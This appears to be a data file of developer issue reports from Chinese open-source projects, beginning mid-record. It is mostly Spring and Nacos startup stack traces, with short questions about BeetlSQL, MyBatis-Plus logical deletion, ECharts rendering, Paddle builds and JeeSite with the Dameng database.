org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:601) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 19 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'externalDumpService': Invocation of init method failed; nested exception is ErrCode:500, ErrMsg:Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:602) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:657) ... 34 common frames omitted Caused by: com.alibaba.nacos.api.exception.NacosException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at com.alibaba.nacos.config.server.service.dump.DumpService.dumpOperate(DumpService.java:236) at com.alibaba.nacos.config.server.service.dump.ExternalDumpService.init(ExternalDumpService.java:52) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:566) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 46 common frames omitted Caused by: java.lang.IllegalStateException: No DataSource set at org.springframework.util.Assert.state(Assert.java:76) at org.springframework.jdbc.support.JdbcAccessor.obtainDataSource(JdbcAccessor.java:86) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:376) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:465) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:475) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:508) at org.springframework.jdbc.core.JdbcTemplate.queryForObject(JdbcTemplate.java:515) at com.alibaba.nacos.config.server.service.repository.extrnal.ExternalStoragePersistServiceImpl.findConfigMaxId(ExternalStoragePersistServiceImpl.java:659) at com.alibaba.nacos.config.server.service.dump.processor.DumpAllProcessor.process(DumpAllProcessor.java:51) at com.alibaba.nacos.config.server.service.dump.DumpService.dumpConfigInfo(DumpService.java:293) at com.alibaba.nacos.config.server.service.dump.DumpService.dumpOperate(DumpService.java:205) ... 54 common frames omitted 2021-07-15 11:51:59.345 WARN 1668 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start close 2021-07-15 11:51:59.346 WARN 1668 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : /Users/lorenzo/nacos/conf 2021-07-15 11:51:59.346 WARN 1668 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : /Users/lorenzo/nacos/data/loader 2021-07-15 11:51:59.346 WARN 1668 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : /Users/lorenzo/nacos/data/tps 2021-07-15 11:51:59.347 WARN 1668 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] already closed 2021-07-15 11:51:59.347 WARN 1668 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Start destroying Publisher 2021-07-15 11:51:59.347 WARN 1668 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Destruction of the end 2021-07-15 11:51:59.347 ERROR 1668 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos failed to start, please see /Users/lorenzo/nacos/logs/nacos.log for more details. 2021-07-15 11:51:59.363 INFO 1668 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2021-07-15 11:51:59.397 ERROR 1668 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'memoryMonitor' defined in URL [jar:file:/Users/lorenzo/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar!/com/alibaba/nacos/config/server/monitor/MemoryMonitor.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'externalDumpService': Invocation of init method failed; nested exception is ErrCode:500, ErrMsg:Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.AldserverNacosApplication.main(AldserverNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.b   <code>: ,--. ,--.'| --.' ./ Console: http://192.168.2.28:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ ----. \ | | ' --' / ' : | ; : .' \ : : --'---' '---' ---'"
beetlsql3.0默认不加载数据源,如题，微服务中有个服务不需要连接数据库，但是包都pom的父类直接导入进来了，去整理依赖太费劲。 有没有什么办法配置默认不加载数据源的。比如说2.0里面直接在启动类上加上@SpringBootApplication(exclude={DataSourceAutoConfiguration.class})就可以避免。   <code>: java.lang.IllegalArgumentException: 缺少 beetlsql.sqlManagers 配置 at org.beetl.sql.starter.BeetlSqlConfig.init(BeetlSqlConfig.java:34) ~[sql-springboot-starter-3.9.0-RELEASE.jar:?] at org.beetl.sql.starter.BeetlSqlConfig.&lt;init&gt;(BeetlSqlConfig.java:19) ~[sql-springboot-starter-3.9.0-RELEASE.jar:?] at org.beetl.sql.starter.BeetlSqlBeanRegister.registerBeanDefinitions(BeetlSqlBeanRegister.java:46) ~[sql-springboot-starter-3.9.0-RELEASE.jar:?]
能不能不用粗暴的解决 别名+createtime 搜索其他模型字段问题,"application/common/controller/Backend.php 会导致bootstarp-table搜索字段没有问题，却出现   <code>: 394行 if (count($tableArr) &gt; 1 &amp;&amp; $tableArr[0] != $name &amp;&amp; !in_array($tableArr[0], $alias) &amp;&amp; !empty($this-&gt;model)) { //修复关联模型下时间无法搜索的BUG $relation = Loader::parseName($tableArr[0], 1, false); $alias[$this-&gt;model-&gt;$relation()-&gt;getTable()] = $tableArr[0]; } mz_file.id mz_file.createtime method not exist:think\db\Query-&gt;mzFile"
标题头动态合并,版本号：1.4.0 积木报表是一款免费报表产品，功能免费源码不开放;   <code>: 动态横向扩展表头后，无法动态合并标题头
Mac上源码编译问题,"CMake Error at cmake/generic.cmake:147 (add_custom_command): Error evaluating generator expression: No target ""paddle_inference_api"" Call Stack (most recent call first): cmake/generic.cmake:234 (merge_static_libs) paddle/fluid/inference/CMakeLists.txt:25 (cc_library)   <code>: $&lt;TARGET_FILE:paddle_inference_api&gt;"
逻辑删除与唯一约束的需求冲突,当前使用版本 3.2.0 场景 表逻辑删除 和 表唯一字段约束 两者需求在一定条件相冲突 数据库中存在一条数据为 id phone deleted 1 12345678901 0 当我想再次添加手机号为 12345678901 的手机号数据时 唯一主键限制了不允许添加 12345678901 建议 逻辑删除 只需要定义未删除的值 logic-not-deleted-value 删除值（logic-deleted-value）可以使用 id_worker 或者 其他sequence 自增序列来完成删除值的定义，而不是使用默认配置 望采纳！   <code>: logic-deleted-value=1 logic-not-deleted-value=0
猜测blade-seata-storage和blade-seata-order模块缺少依赖,"本地启动blade-seata-storage和blade-seata-order模块发现sentinel配置的地址是127.0.0.1的地址. 对比正常启动的模块blade-ops下的blade-admin发现缺少下面依赖.导致不能读取blade-common跟blade-core-launch的配置的sentinel的地址. 由于我对于项目结构不熟悉,不知道是否引用过多或者还缺少其他引用,还请审核下解决方式是否合适.   <code>: &lt;dependency&gt; &lt;groupId&gt;org.springblade&lt;/groupId&gt; &lt;artifactId&gt;blade-common&lt;/artifactId&gt; &lt;version&gt;${blade.project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springblade&lt;/groupId&gt; &lt;artifactId&gt;blade-core-launch&lt;/artifactId&gt; &lt;version&gt;${blade.tool.version}&lt;/version&gt; &lt;/dependency&gt;"
【众智】【计算-AICPU开发】CropAndResizeGradImage,"AICPU算子接入 算子交付规格-支持类型： float32, float64 (float16 cann精度未达标, 暂不验收问题单跟踪，关联cann问题单) 计算CropAndResize算子输入图像张量的梯度。 接口目录：mindspore/ops/operations/image_ops.py grads boxes box_index image_size y method string 可选属性 T type 必选属性 对应底层算子 对应底层AI CPU算子CropAndResizeGradImage Classify Name Type TypeRange Required Doc AttrDefault INPUT grads fp32 TRUE 输入tensor必须为4维，NHWC格式，其中height为裁剪的高度，width为裁剪的宽度 INPUT boxes fp32 TRUE 输入tensor为2维的，且第二维为4，例如[num_boxes,4] INPUT box_index int32 TRUE 一维数组，数据量为num_boxes，数据内容不多于图像数目 INPUT image_size int32 TRUE 输入tensor必须为一维，数据内容为NHWC OUTPUT y fp32,fp16,double TRUE ATTR method string FALSE bilinear REQUIRED_ATTR T type TRUE TF接口： tf.raw_ops.CropAndResizeGradImage https://www.tensorflow.org/api_docs/python/tf/raw_ops/CropAndResizeGradImage 3. 异常处理 4. 算子反向 无需接入反向算子   <code>: class CropAndResizeGradImage(Primitive):"
"使用smart-doc-maven-plugin推送,torna控制台报错","` org.springframework.dao.CannotAcquireLockException: Error updating database. Cause: com.mysql.cj.jdbc.exceptions.MySQLTransactionRollbackException: Lock wait timeout exceeded; try restarting transaction The error may involve cn.torna.dao.mapper.ModuleConfigMapper.updateIgnoreNull-Inline The error occurred while setting parameters SQL: UPDATE SET =?, =?, =?, =?, =?, =?, =?, =?, =? WHERE = ? Cause: com.mysql.cj.jdbc.exceptions.MySQLTransactionRollbackException: Lock wait timeout exceeded; try restarting transaction ; Lock wait timeout exceeded; try restarting transaction; nested exception is com.mysql.cj.jdbc.exceptions.MySQLTransactionRollbackException: Lock wait timeout exceeded; try restarting transaction at org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:267) ~[spring-jdbc-5.2.9.RELEASE.jar!/:5.2.9.RELEASE] at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:72) ~[spring-jdbc-5.2.9.RELEASE.jar!/:5.2.9.RELEASE] at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:73) ~[mybatis-spring-1.3.2.jar!/:1.3.2] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) ~[mybatis-spring-1.3.2.jar!/:1.3.2] at com.sun.proxy.$Proxy63.update(Unknown Source) ~[na:na] at org.mybatis.spring.SqlSessionTemplate.update(SqlSessionTemplate.java:294) ~[mybatis-spring-1.3.2.jar!/:1.3.2] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:63) ~[mybatis-3.4.6.jar!/:3.4.6] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) ~[mybatis-3.4.6.jar!/:3.4.6] at com.sun.proxy.$Proxy65.updateIgnoreNull(Unknown Source) ~[na:na] at cn.torna.common.support.BaseService.update(BaseService.java:158) ~[server-common-1.9.0.jar!/:1.9.0] at cn.torna.service.ModuleConfigService.setDebugEnv(ModuleConfigService.java:191) ~[server-service-1.9.0.jar!/:1.9.0] at cn.torna.service.ModuleConfigService.setDebugEnv(ModuleConfigService.java:203) ~[server-service-1.9.0.jar!/:1.9.0] at cn.torna.api.open.DocApi.lambda$doPush$4(DocApi.java:170) ~[server-api-1.9.0.jar!/:1.9.0] at cn.torna.manager.tx.TornaTransactionManager.execute(TornaTransactionManager.java:35) ~[server-manager-1.9.0.jar!/:1.9.0] at cn.torna.api.open.DocApi.doPush(DocApi.java:160) ~[server-api-1.9.0.jar!/:1.9.0] at cn.torna.api.open.DocApi.lambda$pushDoc$0(DocApi.java:106) ~[server-api-1.9.0.jar!/:1.9.0] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_91] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_91] at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_91] Caused by: com.mysql.cj.jdbc.exceptions.MySQLTransactionRollbackException: Lock wait timeout exceeded; try restarting transaction at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:123) ~[mysql-connector-java-8.0.21.jar!/:8.0.21] at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97) ~[mysql-connector-java-8.0.21.jar!/:8.0.21] at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) ~[mysql-connector-java-8.0.21.jar!/:8.0.21] at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:953) ~[mysql-connector-java-8.0.21.jar!/:8.0.21] at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:370) ~[mysql-connector-java-8.0.21.jar!/:8.0.21] at com.zaxxer.hikari.pool.ProxyPreparedStatement.execute(ProxyPreparedStatement.java:44) ~[HikariCP-3.4.5.jar!/:na] at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.execute(HikariProxyPreparedStatement.java) ~[HikariCP-3.4.5.jar!/:na] at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:46) ~[mybatis-3.4.6.jar!/:3.4.6] at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) ~[mybatis-3.4.6.jar!/:3.4.6] at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:50) ~[mybatis-3.4.6.jar!/:3.4.6] at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) ~[mybatis-3.4.6.jar!/:3.4.6] at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) ~[mybatis-3.4.6.jar!/:3.4.6] at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:198) ~[mybatis-3.4.6.jar!/:3.4.6] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_91] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_91] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_91] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_91] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ~[mybatis-spring-1.3.2.jar!/:1.3.2] ... 15 common frames omitted`   <code>: module_config module_id type config_key config_value extend_id description is_deleted gmt_create gmt_modified id"
echart图表模糊，文字也模糊,"如图：字体模糊 方案1：可改用svg渲染，一劳永逸的办法，不过后果就是丢失canvas 渲染可右键保存图片功能 方案2：可以尝试将 devicePixelRatio 值设大，测试过仅仅会有少许清晰度提升 方案3：如果还有问题，你得查查宽度和高度了   <code>: echarts.init(document.getElementById('chart'), null, { renderer: 'svg' }) echarts.init(document.getElementById('echarts'),null, {devicePixelRatio: 2})"
 Quantize transpiler for fixed-point Quantization training framework.,"Related to #10552:Mac环境编译错误 and https://github.com/PaddlePaddle/Paddle/issues/10551 The user API is like:   <code>: class QuantizeTranspiler: def transpile(self, program, weight_bits=8, activation_bits=8, quant_delay=0):"
注册功能生成的用户，登录时提示“该账号等待审核”，不知道从哪里审核,也就是说，可以注册，然后被卡到“审核”那里，无法继续下去，请问如何继续？   <code>: 打开项目自带的注册功能，通过邮箱注册，注册成功，数据库内也有该数据，只是status显示为“4”，查看字典，意思是待审核；然后登录system和admin这两个账号上去，未查看到任何审核入口； 通过邮箱注册，然后登录，即可 无
star jeesite整合达梦数据库,jeesite版本为4.0.5版本，之前用的oracle数据库，现在换成达梦数据库后启动报错 两种配置方式都试过，都不行，启动报错   <code>: ### Error querying database. Cause: java.lang.IllegalStateException: Cannot determine target DataSource for lookup key [null] ### The error may exist in com/jeesite/modules/sys/dao/ModuleDao.java (best guess) ### The error may involve com.jeesite.modules.sys.dao.ModuleDao.findList ### The error occurred while executing a query ### Cause: java.lang.IllegalStateException: Cannot determine target DataSource for lookup key [null] 08-24 16:46:30.221 DEBUG [com.jeesite.common.utils.SpringUtils] - Clear ApplicationContext:org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext@209775a9: startup date [Tue Aug 24 16:45:39 CST 2021]; root of context hierarchy 08-24 16:46:30.312 INFO [o.s.b.a.l.AutoConfigurationReportLoggingInitializer] - Error starting ApplicationContext. To display the auto-configuration report re-run your application with 'debug' enabled. 08-24 16:46:30.321 ERROR [org.springframework.boot.SpringApplication] - Application startup failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'langController': Unsatisfied dependency expressed through field 'langService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dbUpgrade': Invocation of init method failed; nested exception is org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IllegalStateException: Cannot determine target DataSource for lookup key [null] ### The error may exist in com/jeesite/modules/sys/dao/ModuleDao.java (best guess) ### The error may involve com.jeesite.modules.sys.dao.ModuleDao.findList ### The error occurred while executing a query ### Cause: java.lang.IllegalStateException: Cannot determine target DataSource for lookup key [null] at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:588) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:88) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessPropertyValues(AutowiredAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1264) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:553) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:867) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:543) at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:122) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:693) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:360) at org.springframework.boot.SpringApplication.run(SpringApplication.java:303) at com.jeesite.modules.config.Application.main(Application.java:33) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dbUpgrade': Invocation of init method failed; nested exception is org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: java.lang.IllegalStateException: Cannot determine target DataSource for lookup key [null] ### The error may exist in com/jeesite/modules/sys/dao/ModuleDao.java (best guess) ### The error may involve com.jeesite.modules.sys.dao.ModuleDao.findList ### The error occurred while executing a query ### Cause: java.lang.IllegalStateException: Cannot determine target DataSource for lookup key [null] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:137) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:409) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1620) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:296) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1138) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1066) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:585) ... 17 common frames omitted
专属定制版本v4.2 nacos启动报错,"环境信息 pigx版本: 4.2 是否修改包名: 是 提供详细 2022-01-13 15:17:30.935 INFO 18108 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos started successfully in stand alone mode. use external storage ,--,: : | Nacos ,| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 18108 | : ' '; | / \ / . ; ,. :| : /. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | --' / / ,. |' | '.'|\ \ / / /----' '--'. / ; |.' | , .-./\ \ / ------' 2022-01-13 15:17:36.839 INFO 18108 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=18fb2ff3-e827-3fe0-acf9-6278b44306ca 2022-01-13 15:17:37.068 INFO 18108 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@21a9f95b' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-01-13 15:17:37.074 INFO 18108 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-01-13 15:17:37.479 INFO 18108 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8848 (http) 2022-01-13 15:17:37.787 INFO 18108 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 2652 ms 2022-01-13 15:17:40.763 WARN 18108 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'memoryMonitor' defined in URL [jar:file:/C:/Users/think/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar!/com/alibaba/nacos/config/server/monitor/MemoryMonitor.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'asyncNotifyService': Unsatisfied dependency expressed through field 'dumpService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcConfigChangeNotifier': Unsatisfied dependency expressed through field 'rpcPushService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'rpcPushService': Unsatisfied dependency expressed through field 'connectionManager'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'connectionManager': Invocation of init method failed; nested exception is java.lang.NoSuchMethodError: java.nio.ByteBuffer.flip()Ljava/nio/ByteBuffer; 2022-01-13 15:17:40.784 INFO 18108 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\think\nacos\logs 2022-01-13 15:17:40.784 INFO 18108 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\think\nacos\conf 2022-01-13 15:17:40.784 INFO 18108 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\think\nacos\data 2022-01-13 15:17:40.785 ERROR 18108 --- [ main] c.a.n.c.l.StartingApplicationListener : Startup errors : org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'memoryMonitor' defined in URL [jar:file:/C:/Users/think/.m2/repository/com/pig4cloud/nacos/nacos-config/2.0.2/nacos-config-2.0.2.jar!/com/alibaba/nacos/config/server/monitor/MemoryMonitor.class]: Unsatisfied dependency expressed through constructor parameter 0; 